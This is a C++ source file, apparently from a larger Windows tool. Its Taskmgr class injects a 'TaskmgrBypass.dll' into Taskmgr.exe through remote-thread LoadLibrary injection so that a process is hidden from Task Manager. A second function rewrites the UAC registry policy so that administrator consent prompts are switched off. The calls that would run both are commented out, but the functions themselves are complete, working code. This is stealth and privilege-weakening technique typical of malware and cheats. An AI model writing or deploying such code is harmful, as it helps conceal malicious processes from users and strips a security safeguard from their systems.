#include "../Globals/Globals.hpp"
#include "../Memory/Memory.hpp"
#include "Taskmgr.hpp"
#include <TlHelp32.h>
#include <filesystem>
#include <thread>

bool Taskmgr::hideProcFromTaskMgr() {
	// Get Taskmgr.exe -> procId
	uint32_t procId = memory.getProcessIdByName("Taskmgr.exe");
	if (procId == 0) {
		//printf("[-] Taskmgr::hideProcFromTaskMgr 'procId == 0' %s %d 0x%x\n", __FILE__, __LINE__, GetLastError());
		return false;
	}

	// Find the dll
	std::filesystem::path dllPath = "";
	const std::filesystem::path& curPath = std::filesystem::current_path().parent_path();
	for (const auto& entry : std::filesystem::recursive_directory_iterator(curPath)) {
		if (entry.is_directory())
			continue;
		if (entry.path().filename().string() != "TaskmgrBypass.dll")
			continue;
		dllPath = entry;
		break;
	}

	if (!std::filesystem::exists(dllPath)) {
		printf("[-] Taskmgr::hideProcFromTaskMgr '!std::filesystem::exists(dllPath)' %s %d 0x%x\n", __FILE__, __LINE__, GetLastError());
		return false;
	}
	const std::string& sPath = dllPath.string();


	// Get address of LoadLibraryA
	HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
	if (kernel32 == INVALID_HANDLE_VALUE || kernel32 == NULL) {
		printf("[-] Taskmgr::hideProcFromTaskMgr 'kernel32 == INVALID_HANDLE_VALUE || kernel32 == NULL' %s %d 0x%x\n", __FILE__, __LINE__, GetLastError());
		return false;
	}
	FARPROC loadLibA = GetProcAddress(kernel32, "LoadLibraryA");
	if (loadLibA == NULL) {
		printf("[-] Taskmgr::hideProcFromTaskMgr 'loadLibA == NULL' %s %d 0x%x\n", __FILE__, __LINE__, GetLastError());
		return false;
	}


	// LoadLibrary inject TaskMgrBypass.dll into Taskmgr.exe
	HANDLE processHandle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, procId);
	if (processHandle == INVALID_HANDLE_VALUE) {
		printf("[-] Taskmgr::hideProcFromTaskMgr 'processHandle == INVALID_HANDLE_VALUE' %s %d 0x%x\n", __FILE__, __LINE__, GetLastError());
		return false;
	}

	LPVOID allocated = VirtualAllocEx(processHandle, 0, sPath.size() + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (allocated == NULL) {
		printf("[-] Taskmgr::hideProcFromTaskMgr 'allocated == NULL' %s %d 0x%x\n", __FILE__, __LINE__, GetLastError());
		CloseHandle(processHandle);
		return false;
	}

	size_t writtenBytes = 0;
	if (!WriteProcessMemory(processHandle, allocated, sPath.c_str(), sPath.size() + 1, &writtenBytes)) {
		printf("[-] Taskmgr::hideProcFromTaskMgr '!WriteProcessMemory(processHandle, allocated, sPath.c_str(), sPath.size(), &writtenBytes)' %s %d 0x%x\n", __FILE__, __LINE__, GetLastError());
		CloseHandle(processHandle);
		return false;
	}

	HANDLE thread = CreateRemoteThread(processHandle, 0, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(loadLibA), allocated, 0, 0);
	if (thread == INVALID_HANDLE_VALUE || thread == NULL) {
		printf("[-] Taskmgr::hideProcFromTaskMgr 'thread == INVALID_HANDLE_VALUE || thread == NULL' %s %d 0x%x\n", __FILE__, __LINE__, GetLastError());
		CloseHandle(processHandle);
		return false;
	}

	Sleep(100);

	CloseHandle(thread);
	CloseHandle(processHandle);

	return true;
}

void Taskmgr::tick(void* state) {
	
	Globals* globals = reinterpret_cast<Globals*>(state);

	//if (this->setUAC(globals->taskmgr.shouldDisableUAC))
	//	globals->taskmgr.disabledUAC = globals->taskmgr.shouldDisableUAC;
	//
	//if (globals->taskmgr.madeProcessInvisible)
	//	return;
	//
	//if (!this->hideProcFromTaskMgr()) {
	//	globals->taskmgr.madeProcessInvisible = false;
	//	return;
	//}
	//
	//globals->taskmgr.madeProcessInvisible = true;
}

bool Taskmgr::setUAC(bool state) {

	HKEY hKey;
	LPCSTR subKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
	if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS)
		return false;

	DWORD newValue = 0;
	if (state)
		newValue = 5;
	if (RegSetValueExA(hKey, "ConsentPromptBehaviorAdmin", 0, REG_DWORD, reinterpret_cast<BYTE*>(&newValue), sizeof(DWORD)) != ERROR_SUCCESS)
		return false;

	newValue = 0;
	if (state)
		newValue = 1;
	if (RegSetValueExA(hKey, "PromptOnSecureDesktop", 0, REG_DWORD, reinterpret_cast<BYTE*>(&newValue), sizeof(DWORD)) != ERROR_SUCCESS)
		return false;

	RegCloseKey(hKey);

	return true;
}